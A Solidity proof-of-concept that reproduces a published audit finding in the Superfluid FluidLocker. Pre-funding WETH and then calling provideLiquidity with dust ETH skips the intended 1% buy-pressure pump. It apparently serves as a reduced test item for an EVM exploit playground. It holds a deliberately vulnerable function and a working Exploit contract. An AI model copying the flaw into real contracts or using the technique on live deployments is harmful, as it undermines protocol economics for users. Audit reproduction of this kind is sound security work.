// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Superfluid Locker System — [H-2] Pumponomics can be skipped when using
    FluidLocker::provideLiquidity
    (Sherlock 2025-06-superfluid-locker-system; #58282)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: provideLiquidity pumps only `msg.value * BP_PUMP_RATIO /
    BP_DENOMINATOR` (1% of ETH sent in THIS call), but the Uniswap position is
    sized from `WETH.balanceOf(locker)` — the entire WETH inventory. Pre-sending
    WETH (or ETH→WETH) into the locker, then calling provideLiquidity with a
    dust of ETH, creates a full-sized position while almost no buy-pressure
    (pump) occurs.

    Vulnerable provideLiquidity pump-vs-balance split preserved @>.
    ethPumped counter added (as the finding's own PoC does) for observability
    without changing behaviour. Provenance:
    sherlock-audit/2025-06-superfluid-locker-system@d8beaeed. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockWETH {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "eth");
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    receive() external payable {}
}

/// @dev Mock swap router: "buys" FLUID by burning WETH (simulates pump buy-pressure).
contract MockSwapRouter {
    MockWETH public immutable weth;
    MockERC20 public immutable fluid;
    uint256 public totalWethPumped;

    constructor(MockWETH w, MockERC20 f) {
        weth = w;
        fluid = f;
    }

    function exactInputSingle(uint256 amountIn) external returns (uint256 amountOut) {
        weth.transferFrom(msg.sender, address(this), amountIn);
        totalWethPumped += amountIn;
        // 1:1 mock fill — mint FLUID to the locker as the "bought" tokens
        amountOut = amountIn;
        fluid.mint(msg.sender, amountOut);
    }
}

contract MockNPM {
    MockWETH public immutable WETH9;
    MockERC20 public immutable FLUID;
    uint256 public nextId = 1;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public fluidOf;
    mapping(uint256 => uint256) public wethOf;
    uint256 public lastWethUsed; // how much WETH went into the last position
    uint256 public lastFluidUsed;

    constructor(MockWETH w, MockERC20 f) {
        WETH9 = w;
        FLUID = f;
    }

    function mint(address to, uint256 fluidAmt, uint256 wethAmt) external returns (uint256 tokenId) {
        FLUID.transferFrom(msg.sender, address(this), fluidAmt);
        WETH9.transferFrom(msg.sender, address(this), wethAmt);
        tokenId = nextId++;
        ownerOf[tokenId] = to;
        fluidOf[tokenId] = fluidAmt;
        wethOf[tokenId] = wethAmt;
        lastWethUsed = wethAmt;
        lastFluidUsed = fluidAmt;
    }
}

/// @dev Reduced FluidLocker: provideLiquidity pumps only msg.value slice but LPs full WETH balance.
contract FluidLocker {
    MockERC20 public immutable FLUID;
    MockNPM public immutable NONFUNGIBLE_POSITION_MANAGER;
    MockSwapRouter public immutable SWAP_ROUTER;
    address public immutable lockerOwner;

    uint256 public constant BP_PUMP_RATIO = 100; // 1%
    uint256 public constant BP_DENOMINATOR = 10_000;

    /// @dev Observability counter (added by the finding's own PoC; does not change behaviour).
    uint256 public ethPumped;

    uint256 public activePositionCount;

    error NOT_OWNER();

    constructor(MockERC20 fluid, MockNPM npm, MockSwapRouter router, address owner_) {
        FLUID = fluid;
        NONFUNGIBLE_POSITION_MANAGER = npm;
        SWAP_ROUTER = router;
        lockerOwner = owner_;
    }

    modifier onlyLockerOwner() {
        if (msg.sender != lockerOwner) revert NOT_OWNER();
        _;
    }

    /// @dev VERBATIM shape of the audited provideLiquidity pump/LP split.
    function provideLiquidity(uint256 supAmount) external payable onlyLockerOwner {
        address weth = address(NONFUNGIBLE_POSITION_MANAGER.WETH9());

        uint256 ethAmount = msg.value;

        // Wrap ETH into WETH
        MockWETH(payable(weth)).deposit{value: ethAmount}();

        // Pumponomics (market buy SUP with 1% of the provided paired asset)
        _pump(weth, ethAmount * BP_PUMP_RATIO / BP_DENOMINATOR); // @> VULN: only pumps msg.value*1%; position uses full WETH balance
        // FIX: pump against the full inventory that will be LPd, or size the LP from
        //      (msg.value - pump) only — never mix pre-funded WETH without pumping it.

        // Get the amount of paired asset tokens in the locker (ALL WETH, including pre-funded)
        uint256 ethLPAmount = MockWETH(payable(weth)).balanceOf(address(this));

        // Approve + create position with ALL available WETH + supAmount FLUID
        MockWETH(payable(weth)).approve(address(NONFUNGIBLE_POSITION_MANAGER), ethLPAmount);
        FLUID.approve(address(NONFUNGIBLE_POSITION_MANAGER), supAmount);

        NONFUNGIBLE_POSITION_MANAGER.mint(address(this), supAmount, ethLPAmount);
        activePositionCount++;
    }

    function _pump(address weth, uint256 ethAmount) internal {
        if (ethAmount == 0) return;
        ethPumped += ethAmount; // observability (finding PoC instrumentation)
        MockWETH(payable(weth)).approve(address(SWAP_ROUTER), ethAmount);
        SWAP_ROUTER.exactInputSingle(ethAmount);
    }

    receive() external payable {}
}

contract Owner {
    FluidLocker public locker;
    MockWETH public weth;
    MockERC20 public fluid;

    function configure(FluidLocker l, MockWETH w, MockERC20 f) external {
        locker = l;
        weth = w;
        fluid = f;
    }

    /// @dev Skip pumponomics: pre-fund WETH, then provideLiquidity with dust ETH.
    function skipPump(uint256 ethToPreload, uint256 dustEth, uint256 supAmount) external payable {
        // 1. Manually wrap + transfer WETH into the locker (NOT via provideLiquidity).
        weth.deposit{value: ethToPreload}();
        weth.transfer(address(locker), ethToPreload);

        // 2. Call provideLiquidity with dust ETH + full supAmount.
        //    Only dust*1% is pumped; position uses preloaded WETH + dust.
        locker.provideLiquidity{value: dustEth}(supAmount);
    }

    receive() external payable {}
}

contract Exploit {
    MockERC20 public fluid; // CREATE nonce 1
    MockWETH public weth; // CREATE nonce 2
    MockNPM public npm; // CREATE nonce 3
    MockSwapRouter public router; // CREATE nonce 4
    Owner public ownerActor; // CREATE nonce 5
    FluidLocker public locker; // CREATE nonce 6 — vulnerable

    uint256 public constant SUP_AMOUNT = 100 ether;
    uint256 public constant PRELOAD_ETH = 1 ether;
    uint256 public constant DUST_ETH = 100; // 100 wei dust (matches finding PoC spirit)

    uint256 public ethPumpedSeen;
    uint256 public wethInPosition;

    constructor() {
        fluid = new MockERC20("Fluid", "FLUID");
        weth = new MockWETH();
        npm = new MockNPM(weth, fluid);
        router = new MockSwapRouter(weth, fluid);
        ownerActor = new Owner();
        locker = new FluidLocker(fluid, npm, router, address(ownerActor));
        ownerActor.configure(locker, weth, fluid);
    }

    function run() external payable {
        // Fund locker with FLUID for the SUP side of the LP.
        fluid.mint(address(locker), SUP_AMOUNT);

        // Owner pre-sends WETH, then provideLiquidity with dust ETH.
        // ETH comes from setup seed (address(this).balance) and/or msg.value.
        uint256 need = PRELOAD_ETH + DUST_ETH;
        require(address(this).balance >= need, "need eth");
        ownerActor.skipPump{value: need}(PRELOAD_ETH, DUST_ETH, SUP_AMOUNT);

        ethPumpedSeen = locker.ethPumped();
        wethInPosition = npm.lastWethUsed();

        // Only 1% of the DUST was pumped (1 wei when dust=100).
        uint256 expectedPump = DUST_ETH * 100 / 10_000; // 1
        require(ethPumpedSeen == expectedPump, "only dust pumped");

        // But the position absorbed essentially the full preloaded WETH
        // (preload + dust - pump ≈ 1 ether).
        require(wethInPosition > PRELOAD_ETH * 99 / 100, "full weth in position");
        require(locker.activePositionCount() == 1, "position opened");
        // Locker WETH drained into the position.
        require(weth.balanceOf(address(locker)) == 0, "locker weth empty");
    }

    receive() external payable {}
}
